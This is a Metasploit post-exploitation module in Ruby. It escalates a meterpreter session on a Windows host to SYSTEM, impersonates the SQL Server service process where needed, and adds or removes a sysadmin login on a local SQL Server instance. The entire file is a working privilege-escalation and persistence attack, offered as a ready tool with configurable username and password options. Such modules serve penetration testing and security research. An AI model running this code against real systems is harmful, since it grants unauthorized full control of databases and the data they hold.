##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/post/windows/mssql'

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::MSSQL

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Windows Manage Local Microsoft SQL Server Authorization Bypass',
        'Description'   => %q{ When this module is executed, it can be used to add a sysadmin to local
        SQL Server instances.  It first attempts to gain LocalSystem privileges
        using the "getsystem" escalation methods. If those privileges are not
        sufficient to add a sysadmin, then it will migrate to the SQL Server
        service process associated with the target instance.  The sysadmin
        login is added to the local SQL Server using native SQL clients and
        stored procedures.  If no instance is specified then the first identified
        instance will be used.

        Why is this possible? By default in SQL Server 2k-2k8, LocalSystem
        is assigned syadmin privileges.  Microsoft changed the default in
        SQL Server 2012 so that LocalSystem no longer has sysadmin privileges.
        However, this can be overcome by migrating to the SQL Server process.},
        'License'       => MSF_LICENSE,
        'Author'        => [ 'Scott Sutherland <scott.sutherland[at]netspi.com>'],
        'Platform'      => [ 'win' ],
        'SessionTypes'  => [ 'meterpreter' ]
      ))

    register_options(
      [
        OptString.new('DB_USERNAME',  [true, 'New sysadmin login', '']),
        OptString.new('DB_PASSWORD',  [true, 'Password for new sysadmin login', '']),
        OptString.new('INSTANCE',  [false, 'Name of target SQL Server instance', nil]),
        OptBool.new('REMOVE_LOGIN',  [true, 'Remove DB_USERNAME login from database', false])
      ])
  end

  def run
    # Set instance name (if specified)
    instance = datastore['INSTANCE'].to_s

    # Display target
    print_status("#{session_display_info}: Running module against #{sysinfo['Computer']}")

    # Identify available native SQL client
    get_sql_client
    fail_with(Failure::Unknown, 'Unable to identify a SQL client') unless @sql_client

    # Get LocalSystem privileges
    system_status = get_system
    fail_with(Failure::Unknown, 'Unable to get SYSTEM') unless system_status
    begin
      service = check_for_sqlserver(instance)
      fail_with(Failure::Unknown, 'Unable to identify MSSQL Service') unless service

      print_status("#{session_display_info}: Identified service '#{service[:display]}', PID: #{service[:pid]}")
      instance_name = service[:display].gsub('SQL Server (','').gsub(')','').lstrip.rstrip

      if datastore['REMOVE_LOGIN']
        remove_login(service, instance_name)
      else
        add_login(service, instance_name)
      end
    ensure
      # attempt to return to original priv context
      session.sys.config.revert_to_self
    end
  end

  def add_login(service, instance_name)
    begin
      add_login_status = add_sql_login(datastore['DB_USERNAME'],
                                      datastore['DB_PASSWORD'],
                                      instance_name)

      unless add_login_status
        raise RuntimeError, "Retry"
      end
    rescue RuntimeError => e
      if e.message == "Retry"
        retry if impersonate_sql_user(service)
      else
        raise $!
      end
    end
  end

  def remove_login(service, instance_name)
    begin
      remove_status = remove_sql_login(datastore['DB_USERNAME'], instance_name)

      unless remove_status
        raise RuntimeError, "Retry"
      end
    rescue RuntimeError => e
      if e.message == "Retry"
        retry if impersonate_sql_user(service)
      else
        raise $!
      end
    end
  end

  def add_sql_login(dbuser, dbpass, instance)
    print_status("#{session_display_info}: Attempting to add new login \"#{dbuser}\"...")
    query = mssql_sa_escalation(username: dbuser, password: dbpass)

    # Get Data
    add_login_result = run_sql(query, instance)

    case add_login_result
    when '', /new login created/i
      print_good("#{session_display_info}: Successfully added login \"#{dbuser}\" with password \"#{dbpass}\"")
      return true
    when /already exists/i
      fail_with(Failure::BadConfig, "Unable to add login #{dbuser}, user already exists")
    when /password validation failed/i
      fail_with(Failure::BadConfig, "Unable to add login #{dbuser}, password does not meet complexity requirements")
    else
      print_error("#{session_display_info}: Unable to add login #{dbuser}")
      print_error("#{session_display_info}: Database Error:\n #{add_login_result}")
      return false
    end
  end

  def remove_sql_login(dbuser, instance_name)
    print_status("#{session_display_info}: Attempting to remove login \"#{dbuser}\"")
    query = "sp_droplogin '#{dbuser}'"

    remove_login_result = run_sql(query, instance_name)

    # Display result
    if remove_login_result.empty?
      print_good("#{session_display_info}: Successfully removed login \"#{dbuser}\"")
      return true
    else
      # Fail
      print_error("#{session_display_info}: Unabled to remove login #{dbuser}")
      print_error("#{session_display_info}: Database Error:\n\n #{remove_login_result}")
      return false
    end
  end
end
